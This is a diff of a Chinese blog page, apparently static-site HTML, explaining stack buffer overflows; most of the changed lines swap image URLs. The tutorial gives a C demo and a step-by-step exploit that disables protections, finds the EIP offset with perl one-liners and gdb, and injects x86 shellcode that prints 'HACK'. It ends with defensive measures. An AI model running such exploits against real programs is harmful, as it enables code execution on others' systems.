@@ -418,9 +418,9 @@ height:50vh;
 <!-- /TOC -->
 <h1 id="缓冲区溢出及其原理"><a href="#缓冲区溢出及其原理" class="headerlink" title="缓冲区溢出及其原理"></a>缓冲区溢出及其原理</h1><p>关于缓冲区溢出的原理网上也很多，这里用一个我觉得不错的实验示例进行讲解。</p>
 <p><font color="red">(注意：此处编译环境为CentOS  5.0 (32bit)，其他版本的linux可能需要修改9、10行代码)</font><br>先来看以下这个例子：<br>首先用C语言编写一个程序，如下所示，保存为buffer.c文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">8</span>];  <span class="comment">//创建一个大小为8 的缓冲区</span></span><br><span class="line">	<span class="keyword">int</span> *ret;    </span><br><span class="line">	ret=(<span class="keyword">int</span>*)(buffer+<span class="number">16</span>);  </span><br><span class="line">	(*ret)+=<span class="number">7</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">	<span class="keyword">int</span> x;  </span><br><span class="line">	x=<span class="number">99999</span>;  </span><br><span class="line">	function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);  </span><br><span class="line">	x=<span class="number">1</span>;  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);  </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="编译源程序"><a href="#编译源程序" class="headerlink" title="编译源程序"></a>编译源程序</h2><p>如图1所示，执行#gcc  buffer.c  –o  buffer.o命令，编译源程序。<font color="red">(有些高版本的linux可以加-fno-stack-protector  -z  execstack参数关闭保护措施 )</font><br><img src="http://i1.bvimg.com/658463/d451a9a042810168.png" alt="图1"></p>
+<h2 id="编译源程序"><a href="#编译源程序" class="headerlink" title="编译源程序"></a>编译源程序</h2><p>如图1所示，执行#gcc  buffer.c  –o  buffer.o命令，编译源程序。<font color="red">(有些高版本的linux可以加-fno-stack-protector  -z  execstack参数关闭保护措施 )</font><br><img src="http://www.bbvdd.com/d/20180825215936kko.png" alt="图1"></p>
 <h2 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h2><p>如图1所示，执行./buffer.o命令，输出结果99999.通过分析主函数的流程，应该输出1，可是输出的为99999。原因在于function()函数。</p>
-<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>下面对buffer.o程序在内存中的分步情况及执行流程进行分析。<br>一个程序在内存中通常分为程序段、数据段和堆栈。<br>(1)<strong>程序段</strong>：存放程序的机器码和只读数据<br>(2)<strong>数据段</strong>：存放程序中的静态数据和全局变量<br>(3)<strong>堆栈</strong>：存放动态数据及局部变量<br>在内存中，它们的位置如图2所示:<br><img src="http://i1.bvimg.com/658463/19edeca98fe7706e.png" alt="图2"><br>堆栈是一块保存数据的连续内存，一个名为堆栈指针(SP)的寄存器标识出了栈顶的位置，堆栈的底部在一个固定的地址。图2简化了一下如图3所示，栈的增长是由低地址位向高地址位，而堆的增长刚好相反。<br><img src="http://i1.bvimg.com/658463/b2c3a86f73b7a30e.png" alt="图3"><br>理论上说，局部变量可以用SP加偏移量来引用。堆栈由逻辑堆栈帧组成，一个函数对应一个堆栈帧。<br><strong><em>当调用函数时</em></strong>，逻辑堆栈帧被压入栈中，堆栈帧包括函数的参数、返回地址、EBP(EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码)和局部变量(如果函数有局部变量)。程序执行结束后，局部变量的内容将会消失，但是不会被清除。<br><strong><em>当函数返回时</em></strong>，逻辑堆栈帧从栈中被弹出，然后弹出EBP，恢复堆栈到调用函数时的地址，最后弹出返回地址到EIP(寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。)，从而继续运行程序。<br>如过想多了解一些关于寄存器的知识，可以阅读这篇文章：(<a href="https://blog.csdn.net/chenlycly/article/details/37912755" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/37912755</a>)<br>接下来，我们来看function(1,2,3)函数，调用函数的过程如图4所示：<br><img src="http://i1.bvimg.com/658463/28a1dc54762f40e4.png" alt="图4"><br>&emsp;首先把参数压入栈：在C语言中参数的压栈顺序是反向的，是以从后往前的顺序将function的3个参数3,2,1压入栈中。<br>&emsp;然后保存指令寄存器(ip)中的内容作为返回地址(return2)压入栈中；第3个放入栈的是基址寄存器EBP(sfp)。<br>&emsp;接着把当前的栈指针(sp)复制到EBP，作为新栈帧的基地址(sfp，栈帧指针)。这里准备进入function函数。<br>&emsp;最后把栈指针(sp)减去适当的数值(可以理解为指针由高地址位向低地址位滑动)，将局部变量(buffer和ret)压入栈中执行第9行语句ret=(int<em>)(buffer+16)；后，指针ret指向return2所指的存储单元；<br>&emsp;执行代码中第10行语句(</em>ret)+=7；后，调用函数function()后的返回地址(return2所指的存储单元)指向了第18行，第17行被隔过去了，溢出的数据覆盖了原来的返回地址，因此，该程序的输出结果是99999。<br>这个就是一个简单的栈溢出的情况。</p>
+<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>下面对buffer.o程序在内存中的分步情况及执行流程进行分析。<br>一个程序在内存中通常分为程序段、数据段和堆栈。<br>(1)<strong>程序段</strong>：存放程序的机器码和只读数据<br>(2)<strong>数据段</strong>：存放程序中的静态数据和全局变量<br>(3)<strong>堆栈</strong>：存放动态数据及局部变量<br>在内存中，它们的位置如图2所示:<br><img src="http://www.bbvdd.com/d/20180825220057g8x.png" alt="图2"><br>堆栈是一块保存数据的连续内存，一个名为堆栈指针(SP)的寄存器标识出了栈顶的位置，堆栈的底部在一个固定的地址。图2简化了一下如图3所示，栈的增长是由低地址位向高地址位，而堆的增长刚好相反。<br><img src="http://www.bbvdd.com/d/20180825220138ss9.png" alt="图3"><br>理论上说，局部变量可以用SP加偏移量来引用。堆栈由逻辑堆栈帧组成，一个函数对应一个堆栈帧。<br><strong><em>当调用函数时</em></strong>，逻辑堆栈帧被压入栈中，堆栈帧包括函数的参数、返回地址、EBP(EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码)和局部变量(如果函数有局部变量)。程序执行结束后，局部变量的内容将会消失，但是不会被清除。<br><strong><em>当函数返回时</em></strong>，逻辑堆栈帧从栈中被弹出，然后弹出EBP，恢复堆栈到调用函数时的地址，最后弹出返回地址到EIP(寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。)，从而继续运行程序。<br>如过想多了解一些关于寄存器的知识，可以阅读这篇文章：(<a href="https://blog.csdn.net/chenlycly/article/details/37912755" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/37912755</a>)<br>接下来，我们来看function(1,2,3)函数，调用函数的过程如图4所示：<br><img src="http://www.bbvdd.com/d/20180825220224clm.png" alt="图4"><br>&emsp;首先把参数压入栈：在C语言中参数的压栈顺序是反向的，是以从后往前的顺序将function的3个参数3,2,1压入栈中。<br>&emsp;然后保存指令寄存器(ip)中的内容作为返回地址(return2)压入栈中；第3个放入栈的是基址寄存器EBP(sfp)。<br>&emsp;接着把当前的栈指针(sp)复制到EBP，作为新栈帧的基地址(sfp，栈帧指针)。这里准备进入function函数。<br>&emsp;最后把栈指针(sp)减去适当的数值(可以理解为指针由高地址位向低地址位滑动)，将局部变量(buffer和ret)压入栈中执行第9行语句ret=(int<em>)(buffer+16)；后，指针ret指向return2所指的存储单元；<br>&emsp;执行代码中第10行语句(</em>ret)+=7；后，调用函数function()后的返回地址(return2所指的存储单元)指向了第18行，第17行被隔过去了，溢出的数据覆盖了原来的返回地址，因此，该程序的输出结果是99999。<br>这个就是一个简单的栈溢出的情况。</p>
 <h1 id="缓冲区溢出攻击例子"><a href="#缓冲区溢出攻击例子" class="headerlink" title="缓冲区溢出攻击例子"></a>缓冲区溢出攻击例子</h1><p>接下来，我们将要思考一段包含了可利用缓冲区溢出的代码，并据此展示一次攻击。<br>&emsp;在具体地讨论缓冲区溢出攻击之前，可以先考虑一下此类攻击可能会爆发的现实场景。假设网站上web表单请用户输入数据，如姓名、年龄、出生日期等此类的相关信息。被输入的信息随后被传送到一台服务器上，而这台服务器会将“姓名”字段中输入的数据写入可以容纳N个字符的缓冲区中。如果服务器软件没有去验证可以确保输入的姓名的长度至多为N个字符的话，就可能会发生一次缓冲区溢出。如果溢出的数据是一段恶意代码，那么系统也将可能会去执行，从而受到攻击。<br>&emsp;这里我使用的系统是<strong>ubuntu 18.04 (64bit)</strong>。当前硬件已支持数据保护功能，也即栈上注入的指令无法执行，同时现在的操作系统默认启用地址随机化功能，所有很难猜测到EIP注入的地址。这里就先要把实验环境配置好(这一步很重要，如果实验中出现问题，很大可能就是环境配置的关系)：</p>
 <blockquote>
 <ol>
@@ -443,19 +443,19 @@ height:50vh;
 <p>看解释就知道为什么加这些参数了。<br>编译完成之后，我们简要的说明下一步该如何利用溢出进行攻击。思路如下：<br>&emsp;使用的也是上一个例子的原理，buf数组溢出后，从文件读取的内容就会在当前栈帧沿着高地址覆盖，而该栈帧的顶部存放着返回上一个函数的地址(EIP)，只要我们覆盖了该地址，就可以修改程序的执行路径，使它运行文件中的代码。这种攻击一般也叫做返回库函数攻击。<br>&emsp;因此，我们需要知道从文件读取多少个字节才能开始覆盖EIP。常见的方法有两种：<br>&emsp;一种方法是反编译程序进行推导，另一种方法就是进行基本的手工测试。第一种方法通常需要更深入的汇编知识，且适用于不知道源码的情况。这里我们已经知道源码，已经发现了问题所在，所以就选择后者进行尝试，确定一下写个多少字节才能覆盖EIP。</p>
 <h2 id="三、覆盖EIP"><a href="#三、覆盖EIP" class="headerlink" title="三、覆盖EIP"></a>三、覆盖EIP</h2><p>根据源码我们创建text.txt文件并写入字符进行尝试，尝试的方法很简单，EIP前的空间使用’A’填充，而EIP使用’BBBB’填充，使用两种不同的字母是为了方便找到边界。<br>&emsp;目前知道buf数组大小为32个字符，可以先尝试填充32个’A’和追加’BBBB’，如果程序没有出现segment fault(段错误)，则每次增加’A’字符4个，不断尝试直到程序运行出现segment fault。(我这里到48个的时候出现segment fault，32位系统大概在40左右)如果 ‘BBBB’刚好对准EIP的位置，那么函数返回时，将EIP内容将给PC指针，因为0x42424242(B的ascii码为0x42)是不可访问地址，所以出现segment fault，此时eip寄存器值就是0x42424242。<br>&emsp;这里可以手工在文件文件中输入字符，但毕竟繁琐，所以可以使用perl脚本写入(之后写入shellcode也要用到)。<br>所经过的尝试如下：<br><strong>第一次：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x32 . &quot;B&quot;x4&apos; &gt; test.txt ;</span><br></pre></td></tr></table></figure>
-<p>写入文件中的内容为：AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB<br>再运行程序./bo<br><img src="http://i1.bvimg.com/658463/8d15a158999959c6.png" alt="第一次结果"><br>结果：已溢出，造成输出乱码，但没有segment fault。<br><strong>第二次增加4个A字符：</strong></p>
+<p>写入文件中的内容为：AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB<br>再运行程序./bo<br><img src="http://www.bbvdd.com/d/20180825220402j4k.png" alt="第一次结果"><br>结果：已溢出，造成输出乱码，但没有segment fault。<br><strong>第二次增加4个A字符：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x36 . &quot;B&quot;x4&apos; &gt; test.txt ; ./bo</span><br></pre></td></tr></table></figure>
-<p><img src="http://i2.bvimg.com/658463/960cc24e6304b66a.png" alt="第二次结果"><br><strong>之后的步骤省略，跳到出现segment fault的这一步：</strong></p>
+<p><img src="http://www.bbvdd.com/d/201808252204412bk.png" alt="第二次结果"><br><strong>之后的步骤省略，跳到出现segment fault的这一步：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;B&quot;x4&apos; &gt; test.txt ; ./bo</span><br></pre></td></tr></table></figure>
-<p><img src="http://i2.bvimg.com/658463/990985d6756d708b.png" alt=""><br>结果：产生了segment fault。</p>
+<p><img src="http://www.bbvdd.com/d/20180825220513ijd.png" alt=""><br>结果：产生了segment fault。</p>
 <hr>
 <p>接下来就使用调试工具gdb，分析并确定此时的EIP是否为0x42424242。<br>1.在使用gdb前，首先输入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure>
 <p>用这个命令是为了产生core文件，core就是程序运行发行段错误时的文件。<br>2.接着运再行一下上面的出错的那条指令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bo</span><br></pre></td></tr></table></figure>
-<p>此时当前目录下会出现一个core文件<br><img src="http://i2.bvimg.com/658463/c379a0463bbcedef.png" alt=""><br>3.之后就是使用gdb分析程序：</p>
+<p>此时当前目录下会出现一个core文件<br><img src="http://www.bbvdd.com/d/20180825220541bxf.png" alt=""><br>3.之后就是使用gdb分析程序：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./bo core –q</span><br></pre></td></tr></table></figure>
-<p><img src="http://i2.bvimg.com/658463/7ae94e4e3616f796.png" alt=""></p>
+<p><img src="http://www.bbvdd.com/d/20180825220606zuq.png" alt=""></p>
 <p>分析core文件，发现eip被写成’0x424242’(BBBB)，可以确定注入内容中的’BBBB’对准了栈中存放EIP的位置。 找到EIP位置，我们就离成功迈进了一大步。值得注意的是：现在的系统有保护机制，所以找准eip的难度会大大增加。不过现在也有出现了更多有效的方法，感兴趣的朋友可以更深入地进行学习。</p>
 <hr>
 <h2 id="四、构造shellcode"><a href="#四、构造shellcode" class="headerlink" title="四、构造shellcode"></a>四、构造shellcode</h2><p>通过之前的步骤，我们可以控制EIP之后，下一步操作就是往栈里面注入二进指令，然后修改EIP执行这段代码。那么当函数执行完后，就会执行我们的指令啦。<br> 通常我们将注入的这段指令称为shellcode，解释为这段指令是打开一个shell(bash)，然后攻击者可以在shell执行任意命令，所以称为shellcode。<br> 这里我们不需要写一段复杂的shellcode去打开shell。为了能证明成功控制程序，我们可以使它在终端上输出”HACK”字符串，然后程序退出。 简便起见， 我们构造的shellcode就相当于下面两句C语言的效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write(1, &quot;HACK\n&quot;, 5);</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure></p>
@@ -468,18 +468,18 @@ height:50vh;
 <blockquote>
 <p>ndisasm shell1</p>
 </blockquote>
-<p>得到如下结果：<br><img src="http://i2.bvimg.com/658463/a787508f85dbd30d.png" alt=""></p>
-<p>&emsp;现在我们找到了EIP的位置，也有了我们要执行的shellcode，但这个EIP应该修改为什么值，才能在函数返回时执行注入的shellcode呢？<br>&emsp;我们可以这样想，从栈的基本模型上看(下图)，当函数返回，弹出EBP(栈基址)，恢复堆栈到调用函数时的地址，再弹出返回地址到EIP，ESP寄存器的值(栈指针)向上移动，指向我们的shellcode。因此，我们使用上面的注入内容生成core时，ESP寄存器的值就是shellcode的开始地址，也就是EIP应该注入的值。<br><img src="http://i2.bvimg.com/658463/bac21ce82beef1df.png" alt=""></p>
+<p>得到如下结果：<br><img src="http://www.bbvdd.com/d/20180825220641k35.png" alt=""></p>
+<p>&emsp;现在我们找到了EIP的位置，也有了我们要执行的shellcode，但这个EIP应该修改为什么值，才能在函数返回时执行注入的shellcode呢？<br>&emsp;我们可以这样想，从栈的基本模型上看(下图)，当函数返回，弹出EBP(栈基址)，恢复堆栈到调用函数时的地址，再弹出返回地址到EIP，ESP寄存器的值(栈指针)向上移动，指向我们的shellcode。因此，我们使用上面的注入内容生成core时，ESP寄存器的值就是shellcode的开始地址，也就是EIP应该注入的值。<br><img src="http://www.bbvdd.com/d/201808252208145ia.png" alt=""></p>
 <h2 id="五、注入shellcode"><a href="#五、注入shellcode" class="headerlink" title="五、注入shellcode"></a>五、注入shellcode</h2><p>我们知道要成功执行shellcode就要使EIP的值为shellcode开始的地址。那如何找到shellcode开始的地址呢？我们先尝试着把构造好的shellcode文本给程序执行，使它生成新的core。(这里要先删掉之前的core文件)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;B&quot;x4 . &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x48\x41\x43\x4b\x0a&quot;&apos; &gt; test.txt ;./bo</span><br></pre></td></tr></table></figure>
-<p><img src="http://i2.bvimg.com/658463/6f91c08ddd9ebb4f.png" alt=""></p>
+<p><img src="http://www.bbvdd.com/d/201808252208488kg.png" alt=""></p>
 <blockquote>
 <p>再执行gdb  ./bo core –q</p>
 </blockquote>
-<p><img src="http://i2.bvimg.com/658463/b1b5c4278acbbf2a.png" alt=""></p>
+<p><img src="http://www.bbvdd.com/d/20180825220920g1b.png" alt=""></p>
 <p>上面我们知道，ESP的值就是shellcode开始的地址，ESP现在值为0xffffcf70，所有EIP注入值就是该值，(这一步一定要关闭地址随机化功能)。由于X86是小端的字节序，所以注入字节串需要改为”\x70\xcf\xff\xff”<br>然后将EIP原来的注入值’BBBB’变成”\x70\xcf\xff\xff”，使eip指向的地址为shellcode开始运行的地址即可。再次测试：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;\x70\xcf\xff\xff&quot; . &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x48\x41\x43\x4b\x0a&quot;&apos;&gt; test.txt ;./bo</span><br></pre></td></tr></table></figure>
-<p><img src="http://i2.bvimg.com/658463/65686058894fa689.png" alt=""><br>结果：程序输出HACK字符串了，说明我们成功控制了EIP，并执行了shellcode。<br>如果这段shellcode构造的再复杂一些，我们就能做更多的事。(坏笑~)<br>&emsp;这也是算是最简单的缓冲区溢出漏洞攻击的例子了，所讲的技术也有点过时，对于现在的系统来讲，已经不大可能管用了。但不管怎么样，对于初步的学习还是很助于理解的。一切的学习可以从这个简单的例子出发，一步步的进行更深入下去。然后在其中发现更多的精彩。</p>
+<p><img src="http://www.bbvdd.com/d/201808252209542ms.png" alt=""><br>结果：程序输出HACK字符串了，说明我们成功控制了EIP，并执行了shellcode。<br>如果这段shellcode构造的再复杂一些，我们就能做更多的事。(坏笑~)<br>&emsp;这也是算是最简单的缓冲区溢出漏洞攻击的例子了，所讲的技术也有点过时，对于现在的系统来讲，已经不大可能管用了。但不管怎么样，对于初步的学习还是很助于理解的。一切的学习可以从这个简单的例子出发，一步步的进行更深入下去。然后在其中发现更多的精彩。</p>
 <h1 id="缓冲区溢出攻击的防范"><a href="#缓冲区溢出攻击的防范" class="headerlink" title="缓冲区溢出攻击的防范"></a>缓冲区溢出攻击的防范</h1><p>了解攻击原理是为了能更好的进行防御，最后简要的说明一下如何防范这类攻击的发生。<br>(1)关闭不需要的特权程序。<br>(2)及时给系统和服务程序漏洞打补丁。<br>(3)强制写正确的代码。<br>(4)通过操作系统使得缓冲区不可执行，从而阻止攻击者植入攻击代码。<br>(5)利用编译器的边界检查来实现缓冲区的保护，这个方法使得缓冲区溢出不可能出现，从而完全消除了缓冲区溢出的威胁，但是代价比较大。<br>(6)在程序指针失效前进行完整性检查。<br>(7)改进系统内部安全机制。</p>
 <hr>
 <p><strong><em>参考文章</em></strong>：<a href="https://blog.csdn.net/linyt/article/details/43283331" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/43283331</a><br><strong><em>发表链接</em></strong>：<a href="https://segmentfault.com/a/1190000015993766" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015993766</a></p>
@@ -490,7 +490,7 @@ height:50vh;
         <div class="license-wrapper">
             <p>原文作者: <a href="http://wang66.top">王六六</a>
             <p>原文链接: <a href="http://wang66.top/2018/08/18/浅析缓冲区溢出/">http://wang66.top/2018/08/18/浅析缓冲区溢出/</a>
-            <p>发表日期: <a href="http://wang66.top/2018/08/18/浅析缓冲区溢出/">八月 18日 2018, 4:49:06 下午</a>
+            <p>发表日期: <a href="http://wang66.top/2018/08/18/浅析缓冲区溢出/">August 18th 2018, 4:49:06 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -724,8 +724,6 @@ top:50vh;
     
     
     
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 5
@@ -774,11 +772,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="资源"><span class="iconfont-archer">&#xe606;</span>资源</span>
     
-        <span class="sidebar-tag-name" data-tags="知识"><span class="iconfont-archer">&#xe606;</span>知识</span>
-    
         <span class="sidebar-tag-name" data-tags="工具"><span class="iconfont-archer">&#xe606;</span>工具</span>
     
         <span class="sidebar-tag-name" data-tags="缓冲区"><span class="iconfont-archer">&#xe606;</span>缓冲区</span>
+    
+        <span class="sidebar-tag-name" data-tags="知识"><span class="iconfont-archer">&#xe606;</span>知识</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
